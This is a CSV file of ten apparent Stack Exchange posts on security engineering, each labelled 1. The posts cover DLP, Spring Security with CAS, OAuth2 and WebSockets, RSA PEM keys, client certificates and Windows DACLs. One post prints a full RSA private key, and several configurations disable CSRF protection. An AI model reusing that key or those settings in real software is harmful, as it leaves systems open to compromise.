A,C
"<p>One approach is to lock down endpoints to <strong>block the egress points</strong>, which includes:</p>

<ul>
<li>Disabling local media: USB, SD cards, CD writers, firewire, etc. Many enterprises attempt this - disabling USB is considered a standard baseline - but rarely are all these blocked. Thin clients can do this more robustly than a normal computer.</li>
<li>Blocking network egress: this is harder; some enterprises use a content filtering proxy to block file sharing sites and webmail, but they never block them all, and in particular corporate email needs to be allowed.</li>
<li>You need to prevent unauthorised devices connecting to the network, as these will not have local media disabled, so can be used to egress. Some enterprises attempt this with network access control (NAC).</li>
</ul>

<p>I see this done in many environments, but never comprehensively. But even if this could be implemented perfectly, there is a major problem: it's too restrictive. We disabled USB because we want to stop Joe copying the top secret database onto a USB stick. Now, Joe may want to - quite legitimately - put some non-confidential marketing material on a USB stick to use at a conference. The lockdown prevents this - it doesn't have any concept of classification, so it can't distinguish between a public presentation and a top secret memo. Most enterprises have a process to request USB be re-enabled, with a business justification, but at that point Joe can steal the top secret database.</p>

<p>To improve on this, various vendors have created <strong>Data Loss Prevention</strong> (DLP) tools. Some of them are called Data Loss Mitigation (DLM); it's the same technology. These work in various ways, but most have an agent on the endpoint, and a central management system. When the system is installed, various key documents will be marked as confidential, and some patterns may be used (a popular one is 16 digits, indicating a credit card number). Now, when Joe tries to write a file to his USB stick, the agent checks whether the file is confidential, and then allows (or doesn't allow) the file to be written.</p>

<p>Commercial DLP systems are now pretty mature and try to address all the local media and network egress points. It's important to realise that they are only intended to stop your internal staff. They will not generally stop hackers (despite the claims some vendors make). Still, they are a good technology to have, and although they are not that widely used, I think most security conscious organisations should have it. I think the cost/benefit ratio is better than you get from IDS.</p>

<p>As people have mentioned, one egress point that nothing can protect is people. You can stop someone copying a 10gb database to a USB drive. But if the top secret data is one sentence (""it was xxxx who shot JFK"") then someone can of course read that, remember it, then leak it outside your organisation. And to stop someone photographing their screen you would need physical security controls, like confiscating personal electronic devices.</p>
",1
"<p>I installed a CAS server on my server . ( with war deployment in apache tomcat ) . I have my user information like user name and password on that CAS server . ( in the future it will connect to the LDAP or simple relation database for user credential . The problem is here . I want to authenticate my spring application through this CAS server , but I couldn't find any proper configuration for spring security . My config file is :</p>

<pre><code>        @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf().disable()
            .authorizeRequests()
                .antMatchers(""/assets"",""/css"", ""/js"",""/font-awesome"",""/bootstrap"",""/images"").permitAll()
                .antMatchers(""/"", ""/home"").authenticated()
//                .antMatchers(""/hi"").access(""hasRole('ROLE_SUBSCRIPTION') or hasRole('ROLE_ADMIN')"")
                .antMatchers(""/edit"").authenticated()
//                .antMatchers(""/playlists/*"").authenticated()
//                .antMatchers(""/createplaylist"").authenticated()
                .and()
            .formLogin()
                .loginPage(""/login"")
                .permitAll()
                .and()
            .logout()
                .permitAll();
    }

    @Bean
    public ServiceProperties serviceProperties() {
        ServiceProperties sp = new ServiceProperties();
        sp.setService(env.getRequiredProperty(CAS_SERVICE_URL));
        sp.setSendRenew(false);
        return sp;
    }
    @Bean
    public Set&lt;String&gt; adminList() {
        Set&lt;String&gt; admins = new HashSet&lt;String&gt;();
        String adminUserName = env.getProperty(APP_ADMIN_USER_NAME);

        admins.add(""admin"");
        if (adminUserName != null &amp;&amp; !adminUserName.isEmpty()) {
            admins.add(adminUserName);
        }
        return admins;
    }

    @Bean
    public AuthenticationUserDetailsService&lt;CasAssertionAuthenticationToken&gt; customUserDetailsService() {
        return new CustomUserDetailsService(adminList());
    }
    @Bean
    public CasAuthenticationProvider casAuthenticationProvider() {
        CasAuthenticationProvider casAuthenticationProvider = new CasAuthenticationProvider();
//        casAuthenticationProvider.setAuthenticationUserDetailsService(customUserDetailsService());
//        casAuthenticationProvider.setServiceProperties(serviceProperties());
        casAuthenticationProvider.setTicketValidator(cas20ServiceTicketValidator());
//        casAuthenticationProvider.setKey(""an_id_for_this_auth_provider_only"");
        return casAuthenticationProvider;
    }
    @Bean
    public Cas20ServiceTicketValidator cas20ServiceTicketValidator() {
        return new Cas20ServiceTicketValidator(env.getRequiredProperty(CAS_URL_PREFIX));
    }

    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
//        auth.inMemoryAuthentication().withUser(""admin"").password(""admin"").roles(""ADMIN"");
        auth.authenticationProvider(casAuthenticationProvider());
    }
</code></pre>
",1
"<p>I'm generating a public PEM-format key from a private PEM-format key. I noticed that if I change a few characters near the end of the private PEM that the public PEM generated from the modified private PEM is exactly the same as the result from the unmodified private PEM.</p>

<p>For example, this private PEM</p>

<pre><code>-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCAAZXj8YAEQya8jF8l6Hy56BcRBgplxPd8ZM5LIAWm0w1k/CgB
gvrI28W+5orOyqST2gC4EBEGmLw9s3NC8McL3qqFIQvd6SpWzCJEiI9n+wCkJLYf
715t6BwZo8F82AdqRHwL1lL0T4JeakgcFO5zno2l/NYKpZtS78vIq2F8pwIDAQAB
AoGAIAdFh+lPTMG4mYjN7eBEBQgrbVkDlP85pWhbrbRvdZRtT41APVCWi1diHSf2
J1PQ5iWv9F4gxHPG9fFGr8MrKk+jCM0/rDJsN7yC1yiSerS9zNvoSWu4D1cizRn2
ZOFi+TJZVHAoVvuh1vJdsFLkDmfoXelR6v6ojQxp6IftblECQQD7W4F92yHVIkRt
ZEz5TMYxtFF2d5uwi6XA/1MDuWpK0dK20a7DUGmgQ8faNfSZ/Dr1JmLx0OK/+Ocg
5HnzNo5NAkEAgl7Wa/Lr0TUH5h4L3SsJ1aeYUC6CbzJHBpNTvhuC7YEcs0AJL2k3
qYSM8VpU7q9iGHvfQhnKH9eBXlQbJBt4wwJBAJ1Pj6Ns2afCYoD0HRiJbCD/cVxr
Tw0W2Q4IvbO+/z8EQpQYdv/V+8VJpnJzAjq9GUkEVThyOvdal4yGcaw9oKECQC8V
/a+jXxSCaMXuGC7bOoQWMebTxXxP1mNDlr1UxmbteOYsvKSJBfeNzjHlhENoyK87
HhmLovr5JNpi2iKiYW0CQDyniRLXCyBVayJd3QkuMFKVNUuOytXUFWNXTpLA1Nbb
2K+leKb2KSyyEmRFC2X+QwF9ZBP1C3b0lgBBlBVbpWQ=
-----END RSA PRIVATE KEY-----
</code></pre>

<p>and this private PEM</p>

<pre><code>-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCAAZXj8YAEQya8jF8l6Hy56BcRBgplxPd8ZM5LIAWm0w1k/CgB
gvrI28W+5orOyqST2gC4EBEGmLw9s3NC8McL3qqFIQvd6SpWzCJEiI9n+wCkJLYf
715t6BwZo8F82AdqRHwL1lL0T4JeakgcFO5zno2l/NYKpZtS78vIq2F8pwIDAQAB
AoGAIAdFh+lPTMG4mYjN7eBEBQgrbVkDlP85pWhbrbRvdZRtT41APVCWi1diHSf2
J1PQ5iWv9F4gxHPG9fFGr8MrKk+jCM0/rDJsN7yC1yiSerS9zNvoSWu4D1cizRn2
ZOFi+TJZVHAoVvuh1vJdsFLkDmfoXelR6v6ojQxp6IftblECQQD7W4F92yHVIkRt
ZEz5TMYxtFF2d5uwi6XA/1MDuWpK0dK20a7DUGmgQ8faNfSZ/Dr1JmLx0OK/+Ocg
5HnzNo5NAkEAgl7Wa/Lr0TUH5h4L3SsJ1aeYUC6CbzJHBpNTvhuC7YEcs0AJL2k3
qYSM8VpU7q9iGHvfQhnKH9eBXlQbJBt4wwJBAJ1Pj6Ns2afCYoD0HRiJbCD/cVxr
Tw0W2Q4IvbO+/z8EQpQYdv/V+8VJpnJzAjq9GUkEVThyOvdal4yGcaw9oKECQC8V
/a+jXxSCaMXuGC7bOoQWMebTxXxP1mNDlr1UxmbteOYsvKSJBfeNzjHlhENoyK87
HhmLovr5JNpi2iKiYW0CQDyniRLXCyBVayJd3QkuMFKVNUuOytXUFWNXTpLA1Nbb
2K+leKb2KSyyEmRFC2X+QwF9ZBP1C3b0lgBBlBVbpWdddddddddddddddddddddddddQ=
-----END RSA PRIVATE KEY-----
</code></pre>

<p>both result in the same public PEM being generated:</p>

<pre><code>-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCAAZXj8YAEQya8jF8l6Hy56BcR
BgplxPd8ZM5LIAWm0w1k/CgBgvrI28W+5orOyqST2gC4EBEGmLw9s3NC8McL3qqF
IQvd6SpWzCJEiI9n+wCkJLYf715t6BwZo8F82AdqRHwL1lL0T4JeakgcFO5zno2l
/NYKpZtS78vIq2F8pwIDAQAB
-----END PUBLIC KEY-----
</code></pre>

<p>I thought that changing one character of the private PEM would result in an entirely new public PEM. Am I missing something, or can some characters in fact be modified without affecting the public PEM result?</p>

<p>The JavaScript library I'm using to generate the public PEM from a private PEM is <a href=""https://www.npmjs.org/package/node-rsa"" rel=""nofollow"">rzcoder's node-rsa</a>, which uses <a href=""http://www-cs-students.stanford.edu/~tjw/jsbn/"" rel=""nofollow"">Tom Wu's jsbn crypto library</a>.</p>
",1
"<blockquote>
  <p>who should issue the client certificate?</p>
</blockquote>

<p>An approved authority which is trusted by API service provider. This is not necessary the API service provider itself (though, it is common), this task may be delegated to another entity which will follow requirements set by API provider. When delegated, API provider should be assured that only legitimate and properly authenticated clients receive client certificates.</p>

<p>Certainly, not client is responsible to create client certificates.</p>

<h1>Update</h1>

<p>Depending on particular case, there might be several common scenarios:</p>

<ol>
<li>service provider issues all client certificates. API server is configured to trust only certificates issued by service provider's CAs.</li>
</ol>

<p>This is simplest approach. Client generates CSR and submits it to service provider's CA. When request is properly authenticated and validated, client receives signed certificate which is then used to access API.</p>

<p><strong>Pros:</strong> service provider tracks all individual clients and their certificates.</p>

<p><strong>Cons:</strong> service provider has to maintain all infrastructure to work with validation of client requests and maintain them (renew, reissue, revoke, etc.). May have a notable overhead (for both parties) when client entities are not strictly defined. That is, when you have only 5 clients, this approach is certainly good. When you have thousands, this may be a problem, because service provider will have to follow SLA.</p>

<ol start=""2"">
<li>there is B2B (business-to-business) relationships. Service provider's CA may issue a qualified cross-certificate (with required constraints) to client's issuing CA. Client organization's CA issues certificate to its own personnel to access remote service provider API</li>
</ol>

<p>This option is required to have an operable private PKIs in both organizations, service provider and client organization. Client organization may have a large number of client entities who are allowed to access service provider.</p>

<p><strong>Pros:</strong> reduces certificate management costs on service provider end. Especially when exact number and name of client entities is not known in advance (for example, access is granted on a departament basis). Allows better certificate lifecycle management within client organization.</p>

<p><strong>Cons:</strong> requires a qualified trust between client organization and service provider organization. This opens a hole when client organization may misissue client certificates and not considered well trusted. This question is commonly solved by using PKI audits by a 3rd party audit company. There will be a written policy that describes all technical and legal relationships between organizations. But this approach is costy too (audits, writing policies, etc.).</p>

<p>In some cases, this scenario is grown to more than just 2 organizations and in order to limit a number of cross-certificates, a Bridge CA is built to organize a trust between organizations.</p>
",1
"<p>Is there an analog of the <a href=""https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setfilesecuritya"" rel=""nofollow noreferrer""><code>SetFileSecurity</code> function</a>?</p>

<p>I need to re-write some tests from Python and I'm stuck on this part. In Python I can freely edit a DACL with <code>pywin32</code> (modules with a C++ implementation to work with Windows API). 
I can edit any ACE with <code>win32security</code>.</p>

<p>Change owner to <code>Everyone</code>? Okay.</p>

<pre><code>win32security.SetNamedSecurityInfo(""somefile.txt"", win32security.SE_FILE_OBJECT,
                                       win32security.OWNER_SECURITY_INFORMATION,
                                       win32security.ConvertStringSidToSid(""S-1-1-0""))
sd.SetSecurityDescriptorDacl(1, dacl, 0)
win32security.SetFileSecurity(filename, win32security.DACL_SECURITY_INFORMATION, sd)
</code></pre>

<p>Remove an inherited ACE? Easy.</p>

<pre><code>sd = win32security.GetFileSecurity("""", win32security.DACL_SECURITY_INFORMATION)
dacl = SECURITY_DESCRIPTOR.GetSecurityDescriptorDacl()
dacl.DeleteAce(0)
sd.SetSecurityDescriptorDacl(1, dacl, 0)  # may not be necessary
win32security.SetFileSecurity(filename, win32security.DACL_SECURITY_INFORMATION, sd)
</code></pre>

<p>And all of those without some special permissions.</p>

<p>But if I want to do something like this in C#.  One way I found is changing a security descriptor with pure SDDL, but using <code>System.Security.File.SetAccessControl()</code> with <code>FileSecurity</code> doesn't work if <code>SetSecurityDescriptorSddlForm</code> was called without the <code>SeSecurityPrivilege</code> privilege. Also, even using an administrator token with nearly all privileges, if I want to change something in a ""wrong"" way (delete some inherited ACEs), the security descriptor doesn't apply. If I try to do something ""very wrong"", like set the owner to <code>Everyone</code>, an exception will be thrown.</p>

<pre><code>var sddl_everyone_owner = @""O:S-1-1-0G:DUD:P"";
var path = @""C:\Users\someuser\test.txt"";
FileSecurity fs_edit = new FileSecurity();
fs_edit.SetSecurityDescriptorSddlForm(sddl_everyone_owner);
File.SetAccessControl(path, fs_edit);
</code></pre>

<p>Run with administrator token:</p>

<pre><code>Unhandled Exception: System.InvalidOperationException: The security identifier is not 
allowed to be the owner of this object.
at System.Security.AccessControl.NativeObjectSecurity.Persist(String name, SafeHandle 
   handle, 
   AccessControlSections includeSections, Object exceptionContext)
at System.Security.AccessControl.NativeObjectSecurity.Persist(String name, 
   AccessControlSections includeSections, Object exceptionContext)
at System.Security.AccessControl.NativeObjectSecurity.Persist(String name, 
   AccessControlSections includeSections)
at System.Security.AccessControl.FileSystemSecurity.Persist(String fullPath)
at System.IO.File.SetAccessControl(String path, FileSecurity fileSecurity)
at rtest.Program.Main(String[] args) in C:\somepath\Program.cs:line 52
</code></pre>
",1
"<p>When the student user try to upload image through CKEditor following dialog appeared with an error message.</p>

<p><a href=""https://i.stack.imgur.com/GWeRe.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GWeRe.png"" alt=""enter image description here""></a></p>

<p>I have been searching for a solution for this.still unable to resolve.</p>

<blockquote>
  <p>org.sakaiproject.exception.PermissionException
  user=58095d7f-9abf-405a-a746-b3bdd673f216 lock=content.new
  resource=/content/group/52b29c56-c607-4c31-966d-e0394a7eeb78/21761483_756386641230111_2474470716028905585_n.jpg
    at
  org.sakaiproject.content.impl.BaseContentService.unlock(BaseContentService.java:1784)
    at
  org.sakaiproject.content.impl.BaseContentService.addResource(BaseContentService.java:3587)
    at
  org.sakaiproject.content.impl.BaseContentService.addResource(BaseContentService.java:3141)
    at
  org.sakaiproject.content.impl.BaseContentService.addResource(BaseContentService.java:3211)
    at
  org.sakaiproject.content.impl.BaseContentService.addResource(BaseContentService.java:3200)
    at
  org.sakaiproject.connector.fck.FCKConnectorServlet.doPost(FCKConnectorServlet.java:355)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:646)     at
  javax.servlet.http.HttpServlet.service(HttpServlet.java:727)  at
  org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)
    at
  org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)
    at
  org.sakaiproject.util.RequestFilter.doFilter(RequestFilter.java:709)
    at
  org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)
    at
  org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)
    at
  org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:220)
    at
  org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)
    at
  org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:501)
    at
  org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:170)
    at
  org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
    at
  org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:950)
    at
  org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)
    at
  org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408)
    at
  org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1041)
    at
  org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:607)
    at
  org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:313)
    at
  java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1152)
    at
  java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:622)
    at java.lang.Thread.run(Thread.java:748)</p>
</blockquote>
",1
"<p>So we've implemented the <strong>OAuth2 - client credentials grant</strong> between our <strong>REST server</strong> and a <strong>client application server</strong> using <strong>spring-security</strong> . The client can access its resources with the token it gets using client credentials authentication. </p>

<p>What I don't get are the <strong>Scopes</strong> I can set up for a client and the resources. </p>

<p>I explicitly said, <strong>Client A</strong> has <strong>Role X</strong> with <strong>Scope READ</strong> and I said <strong>Resource U</strong> can be accessed with <strong>Role X</strong> and <strong>Scope READ</strong>. Now I expect the resource to reject any <code>DELETE</code> or <code>POST</code> request but apparently I am mistaken. If I send a <code>HTTP DELETE</code> to <strong>Resource U</strong> it will get through.</p>

<p>So it looks like the Scopes are meaningless in my setup. How can I make use of them?</p>

<p>Or do I still need to limit access at the resource itself as I suggested below?</p>

<hr>

<p>Snippets from our setup:</p>

<pre><code>&lt;oauth:client-details-service id=""clientDetails""&gt;
    &lt;oauth:client client-id=""the_client""
        authorized-grant-types=""client_credentials"" authorities=""ROLE_CLIENT""
        scope=""read"" secret=""secret"" /&gt;
&lt;/oauth:client-details-service&gt;


&lt;http pattern=""/rest/**"" create-session=""never""
    entry-point-ref=""oauthAuthenticationEntryPoint""
    access-decision-manager-ref=""accessDecisionManager""
    xmlns=""http://www.springframework.org/schema/security""&gt;
    &lt;anonymous enabled=""false"" /&gt;

    &lt;intercept-url pattern=""/rest/persons"" access=""ROLE_CLIENT,SCOPE_READ"" /&gt;

    &lt;custom-filter ref=""resourceServerFilter"" before=""PRE_AUTH_FILTER"" /&gt;
    &lt;access-denied-handler ref=""oauthAccessDeniedHandler"" /&gt;
&lt;/http&gt;
</code></pre>

<p>The REST resource:</p>

<pre><code>@Path(""/persons"")
@Named
public class PersonRest {

    @GET
    @Consumes(MediaType.APPLICATION_FORM_URLENCODED)
    @Produces({ MediaType.APPLICATION_JSON })
    public Response getAll(@Context UriInfo uriInfo) {
        // ...
    }

    @DELETE
    @Path(""/{id}"")
    @Consumes(MediaType.TEXT_PLAIN)
    @Produces(MediaType.APPLICATION_JSON)
    @Transactional
    public Response delete(@PathParam(""id"") String id) {
        // ...
    }
</code></pre>

<hr>

<p><strong>Is there any ""simple"" configuration to tell spring security on the server side, that ROLE_READ should allow only GET requests?</strong> </p>

<p>Or do I need some <code>@PreAuthorize</code> annotation or context setup for the specific resource?</p>

<p>So, would something like that work: ? </p>

<pre><code>    @PreAuthorize(""hasScope(read)"")
    @DELETE
    @Path(""/{id}"")
    // ...
    public Response delete(@PathParam(""id"") String id) {
</code></pre>

<p>Though that would be horrible news if I had to do it this way as then I'd have to configure each resource individually...</p>

<p>Maybe I can make use of some <strong>filter</strong>?</p>

<p>Thanks for any help with this!</p>
",1
"<p>While trying to extract SignerCertificate (X509) from CMS Signed data, my code is giving error, no certificate found. I am using bouncycastle libraries for this purpose.</p>

<p>I think I am unable to sign it properly.The code snippets are attached, Have a look and please correct where I am going wrong.</p>

<p>Here is my signing code</p>

<pre><code>        byte[] tokenBytes = TokenUtils.encode( token );
        CMSProcessableByteArray cmsBytes = new CMSProcessableByteArray( tokenBytes ); 

        CMSSignedDataGenerator gen = new CMSSignedDataGenerator();
        List certList = new ArrayList();

        certList.add(certificate);
        Security.addProvider(new BouncyCastleProvider());
        ContentSigner sha1Signer = new JcaContentSignerBuilder(""SHA1withRSA"").setProvider(""BC"").build(privateKey);
        gen.addSignerInfoGenerator(
                new JcaSignerInfoGeneratorBuilder(
                     new JcaDigestCalculatorProviderBuilder().setProvider(""BC"").build())
                     .build(sha1Signer, certificate));

       signedData = gen.generate(cmsBytes, true);
</code></pre>

<p>And here is how i am verifying the signature</p>

<pre><code>public boolean verifySignature( X509Certificate certificate ) throws TokenException {
     Iterator i = signedData.getSignerInfos().getSigners().iterator();
    while ( i.hasNext() ) {

        SignerInformation s = (SignerInformation) i.next();


        try {
            if ( s.verify(new JcaSimpleSignerInfoVerifierBuilder().setProvider(""BC"").build(certificate)))
                return true;
        } catch ( Exception e ) {
            logger.error( ""Error verifying signature."", e );
            throw new TokenException( ""Error verifying token signature."", e );
        }
    }
    return false;
}
</code></pre>

<p>And method for getting signer certificate</p>

<pre><code> public X509Certificate getSignerCertificate() throws TokenException    {        
    if ( signedData == null )
        throw new TokenException( ""No one has signed this token yet!"" );

    try {
        //CertStore certStore = signedData.getCertificatesAndCRLs( ""Collection"", ""SUN"" );
        CertStore certStore = signedData.getCertificatesAndCRLs( ""Collection"", ""SUN"" );

        SignerInformationStore sis = signedData.getSignerInfos();
        Collection c = sis.getSigners();

        if ( c.size() != 1 )
            throw new TokenException( ""Expected one signature, found "" + c.size() );

        Iterator i = c.iterator();
        SignerInformation s = (SignerInformation) i.next();
        Collection certs = certStore.getCertificates( s.getSID() );
        if ( certs.size() != 1 )
            throw new TokenException( ""Expected one certificate, found "" + certs.size() );
        return (X509Certificate) certs.iterator().next();

    } catch ( CMSException cmse ) {
        throw new TokenException( ""Error extracting CertStore from token."", cmse );
    } catch ( GeneralSecurityException gse ) {
        throw new TokenException( ""Provider error extracting certs."", gse );
    } 
}
</code></pre>
",1
"<p>I adapted the following OAauth2 Spring Cloud samples:</p>

<p><a href=""https://github.com/spring-cloud-samples/authserver"" rel=""noreferrer"">Authserver</a> / <a href=""https://github.com/spring-cloud-samples/sso"" rel=""noreferrer"">SSO</a></p>

<p>The only change I made, was using JPA on the Authserver side to check the credentials from a database. Everything works well, except deploying it behind an nginx proxy. As used in the sample apps above, Spring Boot and embedded Tomcat is used. I also properly configured proxy headers:</p>

<pre><code>server.tomcat.protocol-header=X-Forwarded-Proto
server.tomcat.remote-ip-header=X-Real-IP
</code></pre>

<p>Proxying HTTP is working:</p>

<pre><code>accessTokenUri: http://uaa.sample.com/oauth/token
userAuthorizationUri: http://uaa.sample.com/oauth/authorize
</code></pre>

<p>So far so good, but I need to use SSL (obviously):</p>

<pre><code>accessTokenUri: https://uaa.sample.com/oauth/token
userAuthorizationUri: https://uaa.sample.com/oauth/authorize
</code></pre>

<p>If I switch to SSL, I get a 401 from my client application after the auth server is redirecting back from authorize. I captured the HTTP traffic and everything seems to work:</p>

<ul>
<li>GET request to client application</li>
<li>Client app redirects to /login</li>
<li>/login redirects to <a href=""https://uaa.sample.com/oauth/authorize?client_id=reprisk&amp;redirect_uri=http://test.sample.com/login&amp;response_type=code&amp;state=9prwi2"" rel=""noreferrer"">https://uaa.sample.com/oauth/authorize?client_id=reprisk&amp;redirect_uri=http://test.sample.com/login&amp;response_type=code&amp;state=9prwi2</a></li>
<li>Auth server redirects to <a href=""https://uaa.sample.com/login"" rel=""noreferrer"">https://uaa.sample.com/login</a></li>
<li>After login, authorize is called again and the server finally redirects to <a href=""http://test.sample.com/login?code=212eRK&amp;state=9prwi2"" rel=""noreferrer"">http://test.sample.com/login?code=212eRK&amp;state=9prwi2</a></li>
</ul>

<p>The HTTP traffic for HTTP and HTTPS is exactly the same, except that for HTTP a proper referer is set for the last request (AFAIK, the referer isn't checked during OAuth authentication, right?):</p>

<p>HTTP:</p>

<pre><code>GET /login?code=212eRK&amp;state=9prwi2 HTTP/1.1
Host: test.sample.com
...
Referer: http://uaa.sample.com/login
Cookie: JSESSIONID=401EB8D1D1F4297160D518EC253A0CB5; XSRF-TOKEN=95a00a0d-3362-4e9b-b7eb-45addf2d10b4
...

---
HTTP/1.1 302 Found
</code></pre>

<p>HTTPS:</p>

<pre><code>GET /login?code=212eRK&amp;state=9prwi2 HTTP/1.1
Host: test.sample.com
...
Cookie: JSESSIONID=401EB8D1D1F4297160D518EC253A0CB5; XSRF-TOKEN=95a00a0d-3362-4e9b-b7eb-45addf2d10b4
...

---
HTTP/1.1 401 Unauthorized
</code></pre>

<p>Corresponding log message from client application:</p>

<pre><code>Authentication request failed: org.springframework.security.authentication.BadCredentialsException: Could not obtain access token.
</code></pre>

<p>Any ideas why using a proxy and SSL isn't working? I'm happy to share more code and/or log output!</p>

<p>Thanks!!!</p>
",1
"<p>I am using spring security along with Websocket, I have the following method,</p>

<pre><code>@PreAuthorize(""hasAuthority('ROLE_CREATE_USER')"")
@MessageMapping(""/cashDeposit"")
public void cashDeposit(CashDepositRequest cashDepositRequest) {
</code></pre>

<p>And I have websocket security configuration. Now the problem is, when access is denied, it is throwing an exception,</p>

<pre><code>org.springframework.security.access.AccessDeniedException: Access is denied
at org.springframework.security.access.vote.AffirmativeBased.decide(AffirmativeBased.java:84) ~[spring-security-core-4.1.1.RELEASE.jar:4.1.1.RELEASE]
at org.springframework.security.access.intercept.AbstractSecurityInterceptor.beforeInvocation(AbstractSecurityInterceptor.java:233) ~[spring-security-core-4.1.1.RELEASE.jar:4.1.1.RELEASE]
</code></pre>

<p>And I searched through Stackoverflow and I found most of the questions are related to Servlets (HTTPServletRequest/Response) and not to Websocket.</p>

<p>Please let me know, how to handle AccessDeniedException for websocket and how to send a websocket message back to the user saying 403 forbidden.</p>

<h2>UPDATE</h2>

<p>My security config</p>

<pre><code>@Configuration
public class WebSocketSecurityConfig extends          
AbstractSecurityWebSocketMessageBrokerConfigurer {

@Override
protected void configureInbound(MessageSecurityMetadataSourceRegistry messages) {

    messages.simpMessageDestMatchers(""/topic/**"").permitAll()
            .anyMessage().authenticated();
}
@Override
protected boolean sameOriginDisabled() {
    //disable CSRF for websockets for now...
    return true;
}
}
</code></pre>

<p>My security config for rest services,</p>

<pre><code>    @Override
protected void configure(HttpSecurity http) throws Exception {
    http    .csrf().disable()
            .headers().addHeaderWriter( new XFrameOptionsHeaderWriter(
                    XFrameOptionsHeaderWriter.XFrameOptionsMode.SAMEORIGIN)).and()
            .authorizeRequests()
                .antMatchers(""/index.html"").permitAll()
                .antMatchers(""/**.js"").permitAll()
                .antMatchers(""/**.css"").permitAll()
                .anyRequest().authenticated().and()
            .authenticationProvider(authenticationProvider())
                .exceptionHandling()
                .authenticationEntryPoint(entryPoint)
                .and()
            .formLogin()
                .usernameParameter(""username"")
                .passwordParameter(""password"")
                .successHandler(loginSuccessHandler)
                .failureHandler(loginFailureHandler)
                .and()
            .logout()
                .permitAll()
                .logoutRequestMatcher(new AntPathRequestMatcher(""/login"", ""DELETE""))
                .logoutSuccessHandler(logoutSuccessHandler)
                .deleteCookies(""JSESSIONID"")
                .invalidateHttpSession(true)
                .and()
            .sessionManagement()
                .enableSessionUrlRewriting(true)
                .maximumSessions(1);

}
</code></pre>
",1
